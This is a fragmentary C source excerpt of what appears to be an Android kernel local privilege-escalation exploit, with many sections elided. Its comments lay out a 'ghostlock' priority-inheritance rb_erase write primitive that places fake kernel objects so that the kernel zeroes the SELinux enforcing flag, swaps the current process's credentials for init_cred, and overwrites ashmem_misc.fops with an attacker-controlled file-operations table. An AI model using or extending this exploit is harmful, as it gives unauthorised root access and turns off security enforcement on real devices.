...
void log_startup_context(void) {
  ...
  pr_info("startup pid=%d uid=%u/%u gid=%u/%u attr=%s enforce=%s\n",
          getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
          enforce);
  pr_info("limits %s | build=%s slide=pselect main=pselect\n",
          limits, BUILD_VARIANT_LABEL);
}
...
int open_ashmem_device(void) {
  /* Micro-window ashmem: if fd 199 is already open (passed by helper
   * during brief permissive window), dup it and return. This avoids
   * needing SELinux permissive during CyberMeowfia's 30s execution. */
  if (fcntl(199, F_GETFD) >= 0) {
    int dup_fd = dup(199);
...
void put_fake_fops_table(unsigned char *p, size_t off) {
  ...
  /* llseek slot MUST point to the waiter's pi_tree_entry node address — rb_erase
   * uses this slot as a child pointer anchor and writes into it. Pointing it at
   * a function pointer (noop_llseek) causes rb_erase to write to KIMAGE → crash.
   * repair_fake_fops_llseek restores it to noop_llseek AFTER the write lands. */
...
int prepare_skb_payload(uintptr_t base, int payload_mode) {
  ...
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /* ── ghostlock PI write topology ──
     * PI rb_erase writes *right-child-pointer = value.  By placing
     * parent = target-8, the kernel writes write_right into *target.
     *
     * Write 1 (SELinux off): fake_right = base+0x100
     *   base is page-aligned → low byte of written value = 0x00
     *   → selinux_state.enforcing byte zeroed.
     *
     * Write 2 (cred overwrite): fake_right = data_addr(INIT_CRED)
     *   → current->cred pointer replaced with init_cred P0 alias.
     *
     * Write 3 (W1 ashmem fops): fake_right = fake_fops
     *   → ashmem_misc.fops overwritten with controlled fops table.
     *
     * Legacy (CyberMeowfia path): parent = ASHMEM_MISC_FOPS-8,
     *   write fops pointer into ashmem_misc.fops. */
    if (pselect_custom_write) {
      if (pselect_child_node) {
        if (pselect_custom_write == 2)
          ...
          fake_right = base + 0x100;  /* W1: low byte = 0x00 */
      } else {
        fake_right = 0;
      }
      fake_left = 0;
      ...
      /* Legacy: ashmem fops overwrite (CyberMeowfia path) */
...
/* --- ghostlock custom write helpers --- */
